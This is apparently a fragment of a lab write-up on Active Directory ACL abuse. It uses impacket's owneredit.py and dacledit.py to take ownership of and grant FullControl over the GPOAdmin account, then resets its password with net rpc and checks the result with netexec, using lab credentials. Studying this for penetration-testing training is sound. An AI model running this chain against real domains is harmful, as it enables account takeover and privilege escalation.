#### Downloading and Using owneredit.py
```shell
https://github.com/ShutdownRepo/impacket/raw/refs/heads/owneredit/examples/owneredit.py
owneredit.py -action write -new-owner pedro -target GPOAdmin -dc-ip 10.129.205.81 inlanefreight.local/pedro:SecuringAD01
```
<img width="1886" height="339" alt="Pasted image 20251230154334" src="https://github.com/user-attachments/assets/2efafd8e-0eb3-458b-b8cc-11843be2cb56" />
#### Changing User Rights with dacledit.py
```shell
dacledit.py -principal pedro -target GPOAdmin -action write -rights FullControl -dc-ip 10.129.205.81 inlanefreight.local/pedro:SecuringAD01
```
<img width="1892" height="261" alt="Pasted image 20251230154431" src="https://github.com/user-attachments/assets/5539a49f-954b-4f58-a721-55c79ddcd576" />
Now, we can perform the password reset and test that the credentials are correct:
```shell
net rpc password GPOAdmin Mynewpassword1 -U inlanefreight.local/pedro%SecuringAD01 -S 10.129.205.81
netexec ldap 10.129.205.81 -u GPOAdmin -p Mynewpassword1
```
